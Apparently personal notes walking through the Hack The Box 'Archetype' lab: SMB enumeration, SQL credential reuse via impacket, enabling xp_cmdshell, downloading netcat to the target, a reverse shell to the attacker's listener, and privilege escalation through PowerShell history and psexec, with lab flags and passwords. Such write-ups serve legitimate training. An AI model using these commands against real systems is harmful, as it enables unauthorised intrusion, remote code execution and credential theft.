[[ping]] the host
sudo nmap -sC  -sV --min-rate=1000 \[host]
smbclient -N -L \\\\\\\\\[target host IP]\\\\
smbclient -N \\\\\\\\\[target host IP]\\\\backups
ls
get prod.dtsConfig
exit
cat prod.dtsConfig
*username: ARCHETYPE\sql_svc password: M3g4c0rp123*
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
*OR:*
sudo python3 setup.py install
*In case you are missing some modules:*
pip3 install -r requirements.txt

cd impacket/examples/ 
python3 mssqlclient.py -h
python3 mssqlclient.py ARCHETYPE/sql_svc@\[target host IP] -windows-auth
*if install failed or for another reason mssqlclient.py does not run:*
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth

SELECT is_srvrolemember('sysadmin');
*output 1 means true*
EXEC xp_cmdshell 'net user';

*activation of xp_cmdshell as follows:*
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

*now we are able to execute system commands:*
xp_cmdshell "whoami"

*download nc64.exe which is a binary we will upload to the server to get a stable reverse shell and exectue an interactive cmd.exe process on our listening port. wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe  or curl -O https://github.com/int0x33/nc.exe/raw/master/nc64.exe
navigate to the folder (that has this binary) and start simple HTTP server, then the netcat listener in a different tab:*
sudo python3 -m http.server 8000
sudo nc -lvnp 443

*In the mssqlclient service:*
xp_cmdshell "powershell -c pwd"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://[attacker_host_IP]/nc64.exe -outfile nc64.exe"

*to check if it has run correctly, check the http server that is being run, it should look like this:
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.95.187 - - [15/Apr/2026 05:54:07] "GET /nc64.exe HTTP/1.1" 200 -
or run the command below:*

xp_cmdshell "dir C:\Users\sql_svc\Downloads"

*Now, we can bind the cmd.exe through the nc to our listener:*
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe \[attacker host IP] 443"

*looking back at our netcat listener we can confirm our reverse shell and our foothold to the system:*
C:\Users\sql_svc\Downloads>whoami
whoami
archetype\sql_svc

*navigate to C:\Users\sql_svc\Desktop and use type command to read user flag*
type user.txt
3e7b102e78218e935bf3f4951fec21a3

*in the reverse shell on netcat:*
powershell
wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe

![[Pasted image 20260415232613.png|427]]![[Pasted image 20260415232757.png|481]]![[Pasted image 20260415232847.png|511]]

*As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of .bash_history for Linux systems. The file ConsoleHost_history.txt can be located in the directory C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ .*

cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
dir
type ConsoleHost_history.txt 

*admin password is MEGACORP_4dm1n!!*
python3 psexec.py administrator@\[target host IP]

*navigate to Desktop and read root.txt* b91ccec3305e98240082d4474b848528